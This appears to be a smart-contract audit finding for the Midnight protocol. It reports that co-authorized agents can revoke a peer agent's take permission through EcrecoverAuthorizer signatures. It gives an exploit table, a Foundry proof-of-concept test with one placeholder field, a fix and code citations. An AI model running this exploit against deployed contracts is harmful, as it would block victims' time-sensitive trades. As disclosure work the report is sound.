### Title
Co-authorized Agent Can Deauthorize Peer Agents via EcrecoverAuthorizer Signature Delegation - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary

`EcrecoverAuthorizer.setIsAuthorized` accepts a valid signature from any agent already authorized by the `authorization.authorizer`, not only from the authorizer themselves. Because `Midnight.setIsAuthorized` also permits any authorized agent to manage the authorizer's delegation mapping, a co-authorized attacker can sign and submit an `Authorization(authorizer=victim, authorized=takeAgent, isAuthorized=false)` message, atomically revoking a peer agent's take permission. This breaks the invariant that a user's take-agent authorization is only revocable by the user.

### Finding Description

**Root cause — `EcrecoverAuthorizer.setIsAuthorized` lines 33–36:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The signer check accepts any address that `victim` has already authorized in Midnight, not only `victim` themselves. [1](#0-0) 

**Supporting core-contract path — `Midnight.setIsAuthorized` line 732:**

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

The core contract also allows any authorized agent to call `setIsAuthorized` on behalf of the authorizer, so the same deauthorization is reachable both through `EcrecoverAuthorizer` (signature path) and directly (tx path). [2](#0-1) 

**Exact exploit flow:**

| Step | Action |
|------|--------|
| 1 | `victim` calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — required for the sig-based path to work |
| 2 | `victim` authorizes `takeAgent`: `isAuthorized[victim][takeAgent] = true` |
| 3 | `victim` authorizes `attacker`: `isAuthorized[victim][attacker] = true` |
| 4 | Attacker reads `ecrecoverAuthorizer.nonce(victim)` → `N` (public state) |
| 5 | Attacker signs `Authorization{authorizer=victim, authorized=takeAgent, isAuthorized=false, nonce=N, deadline=future}` with attacker's own key |
| 6 | Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)` |
| 7 | Deadline check passes; nonce check passes; `ecrecover` returns attacker's address; `isAuthorized(victim, attacker) == true` → authorization check passes |
| 8 | `Midnight.setIsAuthorized(takeAgent, false, victim)` executes → `isAuthorized[victim][takeAgent] = false` |
| 9 | `takeAgent` calls `midnight.take(offer, …, taker=victim, …)` → `require(taker == msg.sender \|\| isAuthorized[taker][msg.sender])` fails → reverts `TakerUnauthorized` | [3](#0-2) [4](#0-3) 

No existing check prevents this. The nonce is sequential and public; the deadline is attacker-chosen; the signer check explicitly permits delegates.

### Impact Explanation

A victim relying on an authorized take-agent to execute a time-sensitive `take` (e.g., an offer near expiry) will have that agent silently deauthorized by any other agent the victim has ever trusted. The `take` call reverts with `TakerUnauthorized`, the offer expires, and the victim loses the trade. The attack is gasless for the attacker beyond the one transaction and is repeatable every time the victim re-authorizes the take-agent (attacker can front-run each re-authorization with a new deauthorization using the incremented nonce). [3](#0-2) 

### Likelihood Explanation

**Preconditions:**
1. Victim has authorized `EcrecoverAuthorizer` in Midnight (standard setup for any sig-based user).
2. Victim has authorized both a `takeAgent` and at least one other agent (attacker).
3. Attacker knows the current `nonce[victim]` in `EcrecoverAuthorizer` (public storage).

All three are realistic in any multi-agent wallet or DeFi integration scenario. The attack is repeatable: every time the victim re-authorizes `takeAgent`, the attacker can immediately deauthorize it again by consuming the next nonce. There is no cost beyond gas. [5](#0-4) 

### Recommendation

Restrict the signer check in `EcrecoverAuthorizer.setIsAuthorized` to accept only the authorizer's own signature:

```solidity
// Replace lines 33-36 with:
require(signer == authorization.authorizer, Unauthorized());
```

This makes the signature-based path consistent with the principle of least privilege: only the account whose authorization mapping is being modified may sign the change. Separately, consider whether `Midnight.setIsAuthorized` should also be restricted so that authorized agents cannot modify peer authorizations (only the authorizer themselves should be able to do so via direct call). [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Offer} from "../src/interfaces/IMidnight.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract DeauthorizeAgentDoSTest is BaseTest {
    function testCoAuthorizedAgentDeauthorizesTakeAgent() public {
        // Setup: victim, takeAgent, attacker all have private keys
        address victim    = makeAddr("victim");
        address takeAgent = makeAddr("takeAgent");
        address attacker  = makeAddr("attacker");
        // Give attacker a known private key
        uint256 attackerPk = 0xBEEF;
        attacker = vm.addr(attackerPk);

        // Step 1: victim authorizes EcrecoverAuthorizer
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

        // Step 2: victim authorizes takeAgent
        vm.prank(victim);
        midnight.setIsAuthorized(takeAgent, true, victim);

        // Step 3: victim authorizes attacker
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);

        // Confirm setup
        assertTrue(midnight.isAuthorized(victim, takeAgent));
        assertTrue(midnight.isAuthorized(victim, attacker));

        // Step 4: attacker signs deauthorization of takeAgent on behalf of victim
        uint256 currentNonce = ecrecoverAuthorizer.nonce(victim);
        Authorization memory auth = Authorization({
            authorizer:   victim,
            authorized:   takeAgent,
            isAuthorized: false,
            nonce:        currentNonce,
            deadline:     block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Step 5: attacker submits the deauthorization
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert: takeAgent is now deauthorized
        assertFalse(midnight.isAuthorized(victim, takeAgent));

        // Step 6: takeAgent's take call reverts with TakerUnauthorized
        Offer memory offer; // populate with valid offer fields
        offer.buy    = true;
        offer.maker  = lender;
        offer.ratifier = address(dummyRatifier);
        offer.maxUnits = 1000;
        offer.market = /* valid market */;
        offer.expiry = block.timestamp + 200;
        offer.tick   = MAX_TICK;

        vm.prank(takeAgent);
        vm.expectRevert(IMidnight.TakerUnauthorized.selector);
        midnight.take(offer, hex"", 1000, victim, victim, address(0), hex"");
    }
}
```

**Expected assertions:**
- `assertFalse(midnight.isAuthorized(victim, takeAgent))` passes after attacker's call.
- `vm.expectRevert(IMidnight.TakerUnauthorized.selector)` is triggered on `takeAgent`'s `take` call. [4](#0-3) [3](#0-2)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L18-18)
```text
    mapping(address => uint256) public nonce;
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L346-346)
```text
        require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized());
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```
